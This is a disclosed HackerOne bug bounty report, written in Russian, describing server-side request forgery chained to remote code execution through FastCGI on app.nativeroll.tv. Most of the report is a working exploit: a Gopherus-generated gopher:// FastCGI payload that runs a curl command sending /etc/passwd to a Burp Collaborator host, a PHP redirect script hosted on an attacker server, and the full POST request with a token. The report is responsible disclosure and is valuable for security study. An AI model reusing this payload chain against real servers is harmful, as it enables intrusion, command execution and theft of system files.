---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1354335'
original_report_id: '1354335'
title: SSRF + RCE через fastCGI в  POST /api/nr/video
weakness: Server-Side Request Forgery (SSRF)
team_handle: mailru
created_at: '2021-09-29T08:01:26.479Z'
disclosed_at: '2022-03-18T07:19:37.147Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 16
asset_identifier: NATIVEROLL
asset_type: OTHER
max_severity: critical
tags:
- hackerone
- server-side-request-forgery-ssrf
---

# SSRF + RCE через fastCGI в  POST /api/nr/video

## Metadata

- HackerOne Report ID: 1354335
- Weakness: Server-Side Request Forgery (SSRF)
- Program: mailru
- Disclosed At: 2022-03-18T07:19:37.147Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Domain, site, application
--
app.nativeroll.tv


Steps to reproduce
--
1. Традиционно нужен аксес токен от аккаунта паблишера, можно зарегистрировать здесь https://seedr.ru/register-user/publisher
2. Войти как паблишер https://seedr.ru/login/publisher
3. Поперехватывать запросы, получить токен.
4. Скачать тулзу https://github.com/tarunkant/Gopherus, запустить 
```
./gopherus.py --exploit fastcgi
```
На первый вопрос просто нажать Энтер (сработает дефолтный файл), во втором: вбить команду для исполнения. 
В моем случае ```curl -F file=@/etc/passwd 9nxvmc3h8ym4rye1jwur68tc137xvm.burpcollaborator.net/rce```

Пример вывода утилиты: 
```
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH133%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/usr/share/php/PEAR.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%85%04%00%3C%3Fphp%20system%28%27curl%20-F%20file%3D%40/etc/passwd%209nxvmc3h8ym4rye1jwur68tc137xvm.burpcollaborator.net/rce%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
```
Обратите внимание, что при смене команды для исполнения нужно заново вызывать утилиту и задавать команду там, редачить прямо в этом выводе может не сработать, т.к. протокол бинарный и там есть неочевидные вещи.

5. На своем сервере установить скрипт, который редиректит по полученному из утилиты адресу. Мой пример
```
<?php
header('Location: gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH133%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/usr/share/php/PEAR.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%85%04%00%3C%3Fphp%20system%28%27curl%20-F%20file%3D%40/etc/passwd%209nxvmc3h8ym4rye1jwur68tc137xvm.burpcollaborator.net/rce%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00');
?>

```

6. Отправить следующий запрос (здесь мои данные, нужно заменить значения access_token и tag на ваш токен и ваш сервер с вашим скриптом).
```
POST /api/nr/video?access_token=e3c0d2382d0486f400cf5ab8490c370877397e13 HTTP/1.1
Host: app.nativeroll.tv
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 86

data={"type":"VAST","name":"test","tag":"http://eb65-109-235-218-134.ngrok.io/r2.php"}
```

Получаем отбивку с содержимым /etc/passwd с IP адреса 95.213.212.220. При желании легко добивается до полноценного шелла.

Еще раз обращаю внимание, что ССРФ в данном энвайронменте являются критично опасными, даже слепые, и напоминаю о репортах №1346760 и №1348109, сейчас там уже не работает даже просто ССРФ, но нет причин думать, что такая же техника не сработала бы.

## Impact

Атакующий может исполнять произвольные команды на сервере от имени пользователя www-data со всеми вытекающими последствиями.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
